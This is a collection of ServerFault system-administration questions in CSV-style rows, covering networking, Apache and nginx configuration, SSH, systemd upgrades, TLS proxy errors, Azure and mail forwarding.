<p>I have a DSL line from my internet provider with all the service details. Now, I have a TP-Link modem (+router) WD8961N. This is currently running in PPPoE mode. Works perfectly. </p>

<p>My question is this: say I want to use pfSense on an old PC. I have installed the new PCI cards for WiFi and Ethernet. To do that, if I switch the mode of my TP-Link modem to ""Bridge"", then connect the PC with the router using an ethernet cable and configure the PPPoE settings on my PC, will the internet work? As in, is the configuration correct if I want to use my PC as a WiFi router? </p>

<p>My understanding of the bridged mode is that it removes all of the PPP login stuff and tells the router connected to it to do that. </p>

<p>Am I right? Will this work? Any insight is appreciated? </p>
","<router><internet><ethernet><modem><adsl>","2016-01-22 13:55:12"
"926876","How to force Apache to skip binding to failed interface?","<p>I run Apache inside VirtualBox on a laptop.
I also used IP based VirtualHost-s.
I want to be able to have LAN access whenever I move about,
<strong>to certain pre-known networks</strong>.
The IP, however, is <strong>not</strong> ""moving"", since I've setup DHCPs on
the network routers to asign static IPs to MACs, so the IP is 
basically static on each location.</p>

<p>I want to have all those IPs in my Apache config.</p>

<p>However, the Listen directive fails when <strong>one</strong> of the
interfaces is not available.</p>

<p>Is there any way I could make the Listen directive work
in an <strong>OR</strong> fashion instead of <strong>AND</strong> fashion?</p>

<p>Thank you.</p>
","<apache-2.4><http><httpd><httpd.conf><bsd>","2018-08-17 16:31:02"
"751205","Disadvantages of current condition monitoring and failure prediction system","<p>I have a question, which good solutions (software/hardware) have been developed and applied in enterprise for online failure prediction? Zabbix, Openstb, Cacti and similar alternatives ? Can you list some more? Can you describe what advantages and disadvantages they have, spefically in failure prediction aspect ?</p>

<p>I want to know the disadvantages of them and make some improvement by model\algorithms. If you don't know much about the concept of Online failure prediction, please reference the following description. If you already know it, just skip it.</p>

<p><code>Online failure prediction -- It is an approach to evaluate whether an incoming failure will occur in the near future, and when the failure will occur, and in which component (maybe software or hardware) the failure will occur. It's a short-term prediction by tracking failure, detected error reporting, undetected errors' symptoms, faults's auditing (actively searching the faults, for example, search inodes' inconsistency in Linux filesystems).</code></p>

<p>A much more detailed introduction and relevant approaches is described in the paper, <a href=""https://s3-us-west-2.amazonaws.com/mlsurveys/88.pdf"" rel=""nofollow noreferrer"">https://s3-us-west-2.amazonaws.com/mlsurveys/88.pdf</a></p>

<p>Thank you very much !</p>
","<nagios><zabbix><cacti>","2016-01-23 06:46:34"
"926916","How to put your own Server online?","<p>I'm new learner to servers. I installed Ubuntu Server on my computer.</p>

<p><strong>Questions:</strong></p>

<ul>
<li><p>My question is how to put your own server online? </p></li>
<li><p>Which speed is need to put your own server online?</p></li>
<li><p>Which applications need?</p></li>
</ul>
","<linux><ubuntu><application-server>","2018-08-17 20:27:00"
"751305","how to stress test an apache proxy","<p>I've a EC2 instance acting as a proxy for a webserver that are in other region.</p>

<p>This setup works great at the beginning but then, some users start receiving </p>

<pre><code>Proxy error
The proxy server received and invalid response frmo an upstream server.
The proxy server could not handle the request

Reason: Error reading from remote server.
</code></pre>

<p>I guess the connection was resetted, so I added a changed in the configuration file of apache:</p>

<pre><code>  ProxyPass / http://.. retry=1 acquire=3000 timeout=600 Keepalive=On
</code></pre>

<p>Now, I would like to try to reproduce the problem again, is there any tool that can help me with this purpose? maybe <code>ab</code>?</p>
","<apache-2.2><benchmark>","2016-01-24 01:11:02"
"976072","Why is firefox connecting to these servers on startup?","<p>When I startup Firefox without any webpage it connects to all these hosts:</p>

<pre><code>$ netstat -anp | grep ESTABLISHED
tcp        0      0 [REDACTED]:56728      52.41.213.214:443       ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:35370      117.18.237.29:80        ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:35380      117.18.237.29:80        ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:53882      52.89.175.187:443       ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:54558      172.217.24.138:443      ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:33106      23.219.39.25:80         ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:35368      117.18.237.29:80        ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:40282      52.42.232.148:443       ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:44278      52.42.50.122:443        ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:53068      54.230.174.55:443       ESTABLISHED 28943/firefox       
tcp        0      0 [REDACTED]:43654      172.217.31.163:80       ESTABLISHED 28943/firefox       
</code></pre>

<p>I'm curious why its connecting to all these servers even though there is no webpage open. The only thing open is default homepage of firefox. If I inspect the network on that page, there are no calls.</p>
","<firefox>","2019-07-21 05:12:08"
"751329","SSH — allow login with public key only / disable login with password","<p>I am quite new to server administration and I am not doing it very often. Today I wanted to secure my server, especially the ssh server. Is it possible to configure ssh so that only users can login if an public exists in the <code>autorized_keys</code> file? In other words: Disable login with password, only allow login if the public key exists. I searched the web for quite a while but could not find anything pointing me the direction.</p>

<p>Thanks in Ahead. </p>
","<ssh><ssh-keys>","2016-01-24 08:15:49"
"976090","Upload speed to Google Cloud machine is 1.1Gbps","<p>I use GCP VMs very often. Create and delete once chunk of work is done. I need to upload large data file every time. </p>

<p>Consistently it uploads at 1.1Gbps average speed. Internet connection is 80Gbps (verified). Machine is in local to me region (europe-west4).</p>

<p>Is Google throttling connections? Can i make it faster?</p>
","<google-cloud-platform><bandwidth><upload>","2019-07-21 12:05:53"
"751379","Raid Controller: Activating Write Back","<p>We need to activate ""write back""-mode on a raid controller in a storage server.
Do i need to reinstall the operating system or rebuild the raid setup after activating write back?
We can´t test it, because the server which needs to be configured is currently being used in our live environment.</p>

<p>Thanks for help.</p>
","<raid><hardware-raid><raid5>","2016-01-24 15:19:22"
"751452","Run Windows Explorer on remote system from its cygwin shell through SSH","<p>Please consider my problem :)</p>

<p>1) I Have a Windows 7 - x64 system with cygwin installed and SSHD running.<br>
2) From another Windows machine , from futty, SSH to the above machine.<br>
3) Command ""TaskKill /IM explorer.exe /F"" to kill explorer. <strong>Success</strong>!<br>
4) Command ""/cygdrive/c/Windows/sysnative/cmd.exe /c start /B explorer.exe"" to start explorer. <strong>Failed</strong>!!<br>
From task manager I can see that the <strong>explorer</strong> process is <strong>running</strong>, but no visible ""proof"" for it. No icons , <strong>No task bar</strong>.<br>
5) (optional) Command ""ps -W | grep explorer | cut -c 31-36 | paste -s -d,"" to see running explorer process Id from cygwin shell itself.<br></p>

<p>After searching google and StackOverFlow, the command mentioned in step 4 worked manually on direct cygwin shell on target system.<br></p>

<p>Primary:: My question here is, is there any command to replace in Step 4, so that we have a ""neat"" Windows Explorer process up and running ?!<br></p>

<p>Secondary:: My aim is to remotely kill and start windows explorer properly, Any methods for doing it ?! (Ofcourse, through cygwin - direct (most preferred), power shell or cmd commands )<br></p>

<p>Advanced Thanks!
- Rx3 -</p>
","<windows><ssh><shell><cygwin><windows-explorer>","2016-01-25 03:10:21"
"751456","php5-fpm works for a bit and then stops (nginx/wordpress)","<p>I'm running wordpress on an nginx/php5-fpm setup and every few minutes, php stops working.</p>

<p>When someone tries to subscribe, it works at first and then it stops and takes the user to a 500 server error page.</p>

<p>Initially they load,but shortly after my posts/pages get 404s (except homepage and category pages). </p>

<p>Initially it works, and I have to do a restart to get it running again.</p>

<p>php5-fpm.log once showed this:</p>

<pre><code>WARNING: [pool www] server reached pm.max_children setting (5), consider raising it
</code></pre>

<p>and nothing else.</p>

<p>What could be happening?</p>

<p>/etc/nginx/nginx.conf
<a href=""http://pastebin.com/C7Emf2B1"" rel=""nofollow noreferrer"">http://pastebin.com/C7Emf2B1</a></p>

<p>/etc/nginx/sites-available/default
<a href=""http://pastebin.com/Cxg7ETHb"" rel=""nofollow noreferrer"">http://pastebin.com/Cxg7ETHb</a></p>

<p>I'm set up through</p>

<pre><code>listen = 127.0.0.1:9000
</code></pre>

<p>in www.conf file</p>

<p>and</p>

<pre><code>fastcgi_pass 127.0.0.1:9000;
</code></pre>

<p>in default server block</p>

<p>socket wasn't working and giving me a wp login loop on top of everything).</p>

<p>Has anyone had any experience with something like this?</p>
","<nginx><php-fpm><wordpress>","2016-01-25 04:15:59"
"927196","upgrading systemd from backpor 215-230","<p>Hi i have been tasked with little resarch so apart of testing via VM i also ask:
I need to upgrade systemd 215 to 230 on live server on which services are running, its per say streaming server. One of the new component need to utilize systemd 230 and cant work with 215.</p>

<p>its pretty simple per guide
<a href=""https://unix.stackexchange.com/questions/363016/how-to-upgrade-my-systemd-to-latest-version"">https://unix.stackexchange.com/questions/363016/how-to-upgrade-my-systemd-to-latest-version</a> </p>

<pre><code>echo deb http://http.debian.net/debian jessie-backports main &gt; /etc/apt/sources.list.d/jessie-backports.list
apt-get update
apt-get -t jessie-backports install systemd
</code></pre>

<p>But - how it will affect running service? Would i need to stop them all or restart? I simply tired to upgrade on clean system with no problem nor even reboot needed - verified with systemd --version</p>

<p>I plan now to install some simple web service or something and check the behavior but other than than, i would also like to acquire some theory background regarding this from community, so please :)</p>

<p>I assume it its not a problem and at worst, the services needs to be restarted, maybe reboot would be optimal even tho its live server, it can be done as maintenance. Would be great if not.</p>
","<systemd>","2018-08-20 13:48:42"
"751636","2003 domain; no domain admins can RDP","<p>small 2003 domain with &lt;50 clients.  Today I was unable to RDP to my usual set of servers using my domain admin account.  I get the error of:
""To logon to this remote computer, you must be granted  the Allow log on through Terminal Services right.  By default, memers of the Remote Desktop Users group have this right.  If you are not a member of the Remote Desktop Users group or another group that has this right, or if the remote desktop users group does not have this right, you must be granted this right manually.</p>

<p>I then attempted to do so with the administrator@domain account, and that failed as well.  I consoled into one server using VMware console.  This is a server that is set for all employees to be a part of the local Remote access group.  RDPing to that server using any credentials failed.</p>

<p>I would like advise on how to get the domain administrators back able to RDP.  </p>
","<permissions><rdp><windows-server-2003-r2>","2016-01-25 18:21:13"
"751743","Asterisk server with two connections","<p>I need that configuartion
<a href=""https://i.sstatic.net/zhECk.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/zhECk.png"" alt=""enter image description here""></a></p>

<p>It works, but with only one connection, with eth0
<a href=""https://i.sstatic.net/Fufds.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Fufds.png"" alt=""enter image description here""></a></p>

<p>Or with only mobile broadband
<a href=""https://i.sstatic.net/qD3aQ.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/qD3aQ.png"" alt=""enter image description here""></a></p>

<p>I searched for it, but found only forwardind/routing solutions. How i can see asterisk will recieve all traffic(PPP and TCP) and redirect it by rules in extensions.conf, Linux should not routing it, just work with two connections.</p>

<p>Asterisk PPP IP - 31.....<br>
         LAN IP - 192.168.1.100 / 255.255.255.0 /gateway 192.168.1.1<br>
Gate LAN IP - 192.168.1.1     </p>

<p>if eth0 active, mobile broadband active too, but dont working. even if set up mobile first and than up eth0.</p>

<p><a href=""https://i.sstatic.net/TtKP0.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/TtKP0.jpg"" alt=""enter image description here""></a></p>

<p>Using CentOS 6.5 with GNOME</p>
","<networking><centos><asterisk>","2016-01-26 04:39:58"
"751788","is there a way to findout about a file history (create date / create directory / moved directory ) ?","<p>so i found a shell deep in a directory of my website .
my website doesn't have a upload section and i use a well known framework and it covers sql injection ( i use codeigniter active record to work with database) so i dont think its the code itself </p>

<p>i had a ckeditor/ckfinder in my asset folder and i think hacker has used them to upload shell on my server </p>

<p>to make sure where this file has come from i need to know its history ... mainly the first directory which this file has been uploaded to and  perhaps the original name of the file  .</p>

<p>is there any way to find this information about a file ? </p>
","<centos><logging><filesystems>","2016-01-26 11:13:40"
"927697","Segmentation fault when building centos 5 chroot","<p>For some legacy application I decided to use chroot with CentOS 5.</p>

<p>I did install CentOS 5 on virtual machine, then I boot virtual machine with live CD and using tar, I ""copied"" the files from the virtual disk to my (Linux laptop's) HDD.</p>

<p>Then I tried to chroot, but to my surprise I got ""Segmentation fault"".</p>

<p>For ""host"" machine I use Archlinux 64 bit 4.17.13.</p>

<p>CentOS 5 have kernel 2.6.9</p>

<p>Here some info that might be useful:</p>

<pre><code>[nmmm@zenbook c5]$ file centos.5.fs/bin/bash    # this is chroot
centos.5.fs/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.9, stripped

[nmmm@zenbook c5]$ file /bin/bash               # this is my laptop
/bin/bash: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=42602c973215ba5b8ab5159c527e72f38e83ee52, stripped
</code></pre>

<p>On same laptop I use CentOS 7 chroot without any problem.</p>

<p>Do I need some kernel module or something?</p>
","<linux><chroot><legacy>","2018-08-23 15:14:31"
"751835","Use two different mail servers for a single domain","<p>sorry for my english, I have used Google Translate.</p>

<p>I have a Arsys host (an ISP host from Spain), which gives me 50 email accounts with 6GB of storage each.
I have about 6 accounts of those who need more than 6GB each, since they use much mail.</p>

<p>My problem is that I would like, that of the 50 accounts, who no longer need 6GB stay in Arsys, as the price goes into the budget for the storage they provide. But other accounts using more than 6GB use another mail server that offers apart eg. Amazon ... that even if you pay more you get up to 50GB of email</p>

<p>I've been watching Workmail Amazon, Google Apps for Bussiness, Microsoft Exchange, Office 365 ... and another that I do not remember because they offer mail service for businesses. It is quite out of my budget if I want to migrate all your mail accounts. So I just want some loose.</p>

<p>What I want to do is, if there is a DNS configuration to try a mail accounts (&lt;6GB) to the mail server and the other Arsys (> 6GB) other payment server with more storage.</p>

<p>I do not know if I've explained.</p>

<p>Thank you.</p>
","<email><smtp><pop3>","2016-01-26 13:47:46"
"751902","Geo-Availability Single Terminal Server Opinions","<p>First off, I am not an Azure specialist by any means, but I do have experience with creating Azure VM's for site to cloud replication and stand-alone cloud environments for business solutions.</p>

<p>Recently, I been tasked with proposing a solution for a global company who will need access to a terminal server in the cloud from many parts of the globe. Included areas are South Africa, Vietnam, Asia, European countries, south America, and the USA. Now, I know Azure has servers around the world, but I am unclear to whether or not to create multiple terminal servers for access, or if there is a feature that I can replicate the server across different geo locations for performance. Or if anyone has any input as to what would be best practices for providing a terminal server that needs to be accessed from many different locations.</p>

<p>Can I replicate a single terminal server across multiple data centers in azure?</p>

<p>Basically I am in need of a way to make an Azure terminal server performance solid no matter where someone remotes in from. I know RDP protocol in general is very solid with minimal bandwidth requirements, but want to ensure this is a proper solution for my client.</p>

<p>To add, I understand that Azure may not be the best solution. In a perfect work I would have different domains across multiple locations, but I am trying to leverage the cloud as a possible solution to prevent a management nightmare for this company, especially considering their budget is not very large. </p>

<p>End goal is to get them in a Microsoft environment, and remove google drive as their go to for storage and access to documents for their entire business.</p>

<p>Thanks all.</p>
","<azure><terminal-server><infrastructure>","2016-01-26 17:27:21"
"751997","Website shows 403 Error with www. domain","<p>Hi I am facing a problem when I go to my website at <a href=""http://example.com"" rel=""nofollow noreferrer"">http://example.com</a> it works, but if I go to <a href=""http://www.example.com"" rel=""nofollow noreferrer"">http://www.example.com</a>, I get 403 Forbidden on the page.</p>

<p>I did my research online and found a solution telling me to add in a new Entry (www. A record with IP Address) on my DNS Zone but it still did not work.</p>

<p>Any idea what might be the problem and how to solve it?</p>
","<hosting><cname-record><cpanel>","2016-01-27 03:04:54"
"927895","apt-get (Debian 9) openssh-server package keeps prompting for config file options - ignoring options?","<p>I am trying to do non-interactive upgrades.  It seems to works until I get to the openssh-server package.  openssh-server pops up an interactive prompt which doesn't even work. It is ""frozen"" and I have to cntrl-C out of it, manually kill the process and then repair it to continue.  What am I doing wrong?</p>

<p>Note, I can see it using the options I think should work... but it keeps prompting me anyway?   </p>

<pre><code> /usr/bin/dpkg --force-confdef --force-confold --status-fd 17 --configure --pending


ssh -T $i 'export TERM=linux; sudo apt-get -o Dpkg::Options::=""--force-confdef"" -o Dpkg::Options::=""--force-confold"" dist-upgrade'; 
</code></pre>
","<apt>","2018-08-24 17:44:21"
"927920","Cloud app refuses connection on port 80 while 'Allow HTTP traffic' flag is ticked","<p>I have my firewall settings on defaults, what should allow HTTP and HTTPS traffic on my server, but I was only able to connect on 443, but not on 80. What should I do? Cloudflare only works on port 80...</p>
","<google-cloud-platform>","2018-08-24 20:37:29"
"752098","Should I keep SQL Server/ IIS website on the same server?","<p>I know this type of question has already been asked (<a href=""https://serverfault.com/questions/165216/difference-of-speed-if-sql-server-is-on-one-server-and-website-is-on-another-ra"">Difference of speed if SQL Server is on one server and website is on another, rather than both on same server</a>), I don't know if it's applicable to my situation.</p>

<p>The current situation:</p>

<p>I have one dedicated server (Corei5 3.6ghz, 4 cores, no HT, 32 gb of ram, 120go ssd + 1tb hdd) where I host almost everything needed for the website to run (IIS, SQL server, mail server, Redis cache).
The choice of putting them all together was at first to minimize the cost.</p>

<p>The website currently generate a good amount of traffic (arround 90 millions request on the website per day) and the database is under pressure as well (an average of 1500 requests per second).</p>

<p>I of course already thought about separating those 2. The cpu activity is quite high (generally between 70 and 80%).</p>

<p>My main question is: I'm afraid of the issues that having 2 servers can bring, especially in term of performance.</p>

<p>It is usually said that it's recommended to separate, but is it also the case considering the number of requests made on the database ? I'm especially scared about the network latency between the 2 servers cause I have no real control on it.</p>

<p>With such an amount of SQL requests, will the network latency and the bandwidth can be an issue ?
Pinging between the servers I have at my hosting provider is lower than 2ms.
The bandwidth is 100mb/s.</p>

<p>Would you think it's a good idea to separate them ?</p>

<p>Thanks,</p>
","<windows-server-2012-r2><iis-8.5><sql-server-2014>","2016-01-27 12:04:25"
"928034","Where to get multiple Public IP addresses from?","<p>I have a broadband connection that has one single Public IP address,</p>

<p>Now I want to set up a home datacenter with OpenStack,</p>

<p>My problem is that whenever I launch a new VPS in my master server, each VPS needs a Public IP address in order to be accessible from the outer world.</p>

<p>I understand that I can add IP address and pools,
However, How can I get those extra IP address?</p>

<p>From my ISP?
And how costly can it be?
How many ip addresses can I have? is there a limit?</p>

<p>Sorry, noob here.</p>
","<linux-networking><datacenter>","2018-08-26 07:43:56"
"928074","radius or wpa2 error? - comptia network+","<p>Im taking the COMPTIA Network+ exam on thursday and have this practice question I dont understand the difference:</p>

<p>Users connecting to an SSID appear to be unable to authenticate to the captive portal. Which of the following is the cause of this issue?
A. WPA2 security key
B. SSL certificates
C. CSMA/CA
D. RADIUS
Correct Answer: D</p>

<p>My question is how do you know it is a RADIUS problem and not a bad wpa2 password</p>
","<radius><wpa2>","2018-08-26 19:23:49"
"752317","Which hosting provider for website whose audience spans China's Great Firewall?","<p>We are building a website which will have a large proportion of its audience in mainland China. Another large proportion of the site's audience will be outside China. We estimate the split to be approx 60% China, 40% overseas, so we cannot ignore the needs of either group. We want the site to perform well for both groups.</p>

<p>In China, the so-called 'Great Firewall' (GFW) that is used to block sites also introduces a lot of network latency. This leads to poor site performance if users in China access a server outside China. So, we plan to run servers inside China as well as servers outside China, and serve users based on their location.</p>

<p>Furthermore, some large corporations with hosting operations (e.g. Google) have upset the authorities here, and access to their offerings is restricted.</p>

<p>We want to choose a hosting provider on which to build a site infrastructure that 'spans' the GFW. Our provider a) will have operations both inside and outside of mainland China and b) will not have, and is unlikely to have in the near future, restrictions placed upon access to its products.</p>

<p>Our research points to our options being Ali Cloud (run by China's Alibaba), Microsoft Azure, and Amazon AWS, but we're open to suggestions.</p>
","<cloud-hosting><china>","2016-01-28 06:20:25"
"928287","Why is git not using identity set in ssh config file?","<p>I am trying to connect to my local <a href=""https://gitea.io/en-us/"" rel=""nofollow noreferrer"">Gitea</a> server. I have set it up to use the integrated SSH server on port 2222. I am running Windows. Gitea is running fine.</p>

<p>Now I want to connect using <a href=""https://cygwin.com/git.html"" rel=""nofollow noreferrer"">Cygwin's git</a>. For testing the connection to my repository I am using the <a href=""https://superuser.com/a/833286/374087"">ls-remote</a> command which works fine if I use the <a href=""https://git-scm.com/docs/git#git-codeGITSSHCOMMANDcode"" rel=""nofollow noreferrer""><code>GIT_SSH_COMMAND</code></a> option like this:</p>

<pre><code>GIT_SSH_COMMAND=""ssh -i ~/.ssh/id_rsa"" git ls-remote --exit-code -h ssh://username@localhost:2222/username/Repo.git
</code></pre>

<p>Next I want to simplify life using <code>~/.ssh/config</code>:</p>

<pre><code>host gitea
 HostName localhost
 Port 2222
 IdentityFile ~/.ssh/id_rsa
 User username
</code></pre>

<p>However, this does fail with error <code>Unable to open connection</code>:</p>

<pre><code>git ls-remote --exit-code -h ssh://gitea/username/Repo.git
</code></pre>

<p>Problem: <code>IdentityFile</code> is not applied. This works:</p>

<pre><code>GIT_SSH_COMMAND=""ssh -i ~/.ssh/id_rsa"" git ls-remote --exit-code -h ssh://gitea/username/Repo.git
</code></pre>

<p>I am certain though, that my <code>~/.ssh/config</code> is correct, because connecting via directly <code>ssh -vv gitea</code> works. Output (extract):</p>

<pre><code>[...]
debug1: Connecting to localhost [::1] port 2222.
debug1: Connection established.
[...]
debug1: Offering public key: RSA SHA256:XXX /home/username/.ssh/id_rsa
debug2: we sent a publickey packet, wait for reply
debug1: Server accepts key: pkalg ssh-rsa blen 535
debug2: input_userauth_pk_ok: fp SHA256:XXX
debug1: Authentication succeeded (publickey).
Authenticated to localhost ([::1]:2222).
[...]
</code></pre>

<p>So why is <code>git</code> not using <code>IdentityFile</code> from <code>~/.ssh/config</code>?</p>
","<ssh><git><cygwin>","2018-08-28 07:39:56"
"752401","app runs much slower on VPN","<p>I have an app that accesses the internal network at work.  I can run it from home via VPN but when I do, it runs much slower.  I suspect that it is getting timeouts caused by the firewall and somehow recovering.  Is there a utility I can run on my machine to diagnose this?  I'm thinking I can then request a modification to the firewall rules to relieve the timeouts.</p>
","<vpn><firewall>","2016-01-28 13:39:53"
"928288","Best practice for Domain Controller","<p>I have a main DC on Microsoft Azure VM and an on-premise DC. Both domain networks are connected with site-to-site VPN. </p>

<p>The purpose of setting up the DC on cloud was to get rid of the old on-premise servers. If the site-to-site VPN is disconnected, there will be login authentication issue. I ended up keeping the old servers up and running.</p>

<p>The on-premise DC stopped working yesterday due to hardware issue. I don't plan to replace the hardware because it is really old already.</p>

<p>Microsoft Azure guarantees at least 99.9% uptime and office Internet has been stable, I am thinking not to replace the old DC. Is it really necessary to have an on-premise DC ?</p>
","<active-directory><domain-controller><site-to-site-vpn><azure-networking>","2018-08-28 07:48:06"
"928388","Client sends TCP ACK FIN right after successful TLS Handshake","<p>I have a problem with one of my virtualhost. 
My config:
a reverse proxy with Centos 7 + apache 2.4 and a backend with Microsoft IIS 6.0.</p>

<p>When I do a curl from the proxy to the virtualhost (curl -k <a href=""https://blabla.com/"" rel=""nofollow noreferrer"">https://blabla.com/</a>) I get a proxy error:</p>

<pre><code>&lt;!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;500 Proxy Error&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Proxy Error&lt;/h1&gt;
The proxy server could not handle the request &lt;em&gt;&lt;a href=""/""&gt;GET&amp;nbsp;/&lt;/a&gt;&lt;/em&gt;.&lt;p&gt;
Reason: &lt;strong&gt;Error during SSL Handshake with remote server&lt;/strong&gt;&lt;/p&gt;&lt;p /&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>

<p>When I look at the packets it is what I get:</p>

<pre><code>1) Client sends [SYN] to server.
2) Server sends [SYN,ACK] to client.
3) Client sends [ACK] to server.
4) Client sends the message “Client Hello” to the server.
5) Server sends its public key with the message “Server Hello, Certificate, Server Hello Done”
6) Client sends its public key with the message “Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message”
7) Server sends encrypted handshake message with the message “Change Cipher Spec, Encrypted Handshake Message”
8) Client sends [FIN,ACK]
9) Server sends RST
</code></pre>

<p>The cypher the server wants to use is tls_rsa_with_3des_ede_cbc_sha.</p>

<p>I do not have access to the backend server.</p>

<p>But when I do the same but from the proxy to the real IP of the backend (e.g. curl -k <a href=""https://10.0.0.1/"" rel=""nofollow noreferrer"">https://10.0.0.1/</a>), it works perfectly. It is just when passing by the proxy that it does not work.</p>

<p>Do you know what is going wrong?</p>
","<ssl><iis><apache-2.4><rst>","2018-08-28 20:16:45"
"928425","Wrong directory on virtualhost","<p>I'm trying to have 3 different domains on my VPS, those are </p>

<pre><code>pd.lsgob.us
intranet.lsgob.us 
lsgob.us
</code></pre>

<p>I have configured them but for some reason I'm getting redirected to the same index.html that the one in lsgob.us</p>

<p>intranet.lsgob.us</p>

<p><a href=""https://i.sstatic.net/0Wwxz.png"" rel=""nofollow noreferrer"">https://i.sstatic.net/0Wwxz.png</a></p>

<p>lsgob.us</p>

<p><a href=""https://i.sstatic.net/9KHFW.png"" rel=""nofollow noreferrer"">https://i.sstatic.net/9KHFW.png</a></p>

<p>Virtualhost intranet</p>

<pre><code>&lt;VirtualHost *:80&gt;

    ServerAdmin soporte@lsgob.us
    ServerName intranet.lsgob.us
    ServerAlias www.intranet.lsgob.us
    DocumentRoot ""/var/www/intranet/""

    &lt;Directory ""/var/www/intranet/""&gt;

            Options Indexes FollowSymLinks
            AllowOverride all
            Require all granted

    &lt;/Directory&gt;

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    RewriteEngine on
    RewriteCond %{SERVER_NAME} =www.intranet.lsgob.us [OR]
    RewriteCond %{SERVER_NAME} =intranet.lsgob.us
    RewriteRule ^ https://%{SERVER_NAME}%{REQUEST_URI} [END,NE,R=permanent]
&lt;/VirtualHost&gt;

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
</code></pre>

<p>Virtualhost lsgob</p>

<pre><code>&lt;VirtualHost *:80&gt;

    ServerAdmin soporte@lsgob.us
    ServerName lsgob.us
    ServerAlias www.lsgob.us
    DocumentRoot /var/www/lsgob

    &lt;Directory /var/www/lsgob&gt;

            Options Indexes FollowSymLinks
            AllowOverride all
            Require all granted

    &lt;/Directory&gt;

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    RewriteEngine on
    RewriteCond %{SERVER_NAME} =www.lsgob.us [OR]
    RewriteCond %{SERVER_NAME} =lsgob.us
    RewriteRule ^ https://%{SERVER_NAME}%{REQUEST_URI} [END,NE,R=permanent]
&lt;/VirtualHost&gt;

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
</code></pre>
","<linux><apache-2.2><ubuntu><virtualhost><apache2>","2018-08-29 01:43:00"
"928455","Is there now a 1u (or for that matter 2u) solution for PCs with graphics cards?","<p>For rack PCs, with nVidia (or similar) graphics cards (so, 1060s etc),</p>

<p>we use normal 4u rack mounted PCs.</p>

<p>So if you have 4 or 8 of them in a rack it's obviously a huge amount of height space.</p>

<p>In fact, these days (2018) is there a realistic rack PC that is 1u, but can take a normal nVidia card.</p>

<p>Of course, it has to run server-style 24/7 heat wise.</p>
","<rackmount><nvidia>","2018-08-29 07:41:55"
"752550","WIFi Authentication with Windows Active Directory","<p>What would you recommend for scenario.</p>

<p>Office with 100 employees multiple device platforms(Apple , Windows and Android).
Existing Windows Active Directory on Windows 2008 but not all devices use this to authenticate (Personal Laptops , guests and Personal phones/tablets).</p>

<p>The desire to connect to the wifi using active directory username and password (NB little to none client side configuration just type username and password and forget about wifi , connecting again at password change)</p>

<p>No captive portal just like connecting to your home wifi.</p>

<p>Ubiquiti Access Points </p>
","<windows-server-2008><active-directory><wifi><radius><802.1>","2016-01-29 00:23:51"
"752551","bash scripts work fine when I run it from command line but not from cron","<p>I have this bash script in runtests.sh file</p>

<pre><code>#!/bin/bash
cd /Library/WebServer/Documents/protractor_clipboards
protractor testscript.js
</code></pre>

<p>When I do this on terminal</p>

<pre><code>./runtests.sh 
</code></pre>

<p>But when I try to run it from crontab -e file I get this error</p>

<pre><code>/Library/WebServer/Documents/test/runtests.sh: line 3: protractor: command not found
</code></pre>

<p>I know that protractor is the command works but not sure whats going on</p>

<p>here is my crontab -e</p>

<pre><code>*/5 * * * *  /Library/WebServer/Documents/test/runtests.sh
</code></pre>

<p>Thanks</p>
","<bash><cron><shell><shell-scripting>","2016-01-29 00:24:35"
"752553","How to recover from switch failure?","<p>Suppose there is only one switch within a system and it is connected to a bunch of machines to form a network. If this switch goes down, the entire network goes down. Chances of this happening are unlikely. I would like to know... what are the ways to increase the availability of these machines?</p>

<p>Would I need to have a second switch connected to each machine (so each machine needs 2 network adapters)? Or could I somehow obtain a switch that is able to failover to another backup switch? Is there other recommended ways to do this?</p>

<p>Thank you for your guidance.</p>
","<switch><failover>","2016-01-29 00:42:54"
"752613","Avoid Mail Delivery System Bounce Forward","<p>I have the following mail setup: </p>

<p><a href=""https://i.sstatic.net/RiH1c.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/RiH1c.png"" alt=""enter image description here""></a></p>

<p>This is what happens at the numbered stages:</p>

<ol>
<li>some spam-address (which actually does not exist) sends spam to <em>info@xyz.org</em></li>
<li>the <em>info@xyz.org</em> has an auto-reply configured which is sent automatically to <em>spam@spam.org</em> (which does not really exist)</li>
<li>since <em>spam@spam.org</em> does not really exist, the <em>info@xyz.org</em> receives a 
<em>Mail Delivery System</em> message from the Mailer-Daemon (the daemon is omitted from the picture for the sake of clarity). The Mail Delivery System message looks like this: <a href=""https://i.sstatic.net/bROIo.png"" rel=""nofollow noreferrer"">https://i.sstatic.net/bROIo.png</a></li>
<li>My issue here is, that this <em>Mail Delivery System</em> mail gets forwarded to person1@private.com (etc...) because I have configured a mail forward from <em>info@xyz.org</em> to <em>person1@private.com</em>, etc...</li>
</ol>

<p>What can I do to avoid step 4, that is, the auto forward from the mail delivery system error message to the forward mail addresses (<em>person1@private.com</em>)</p>

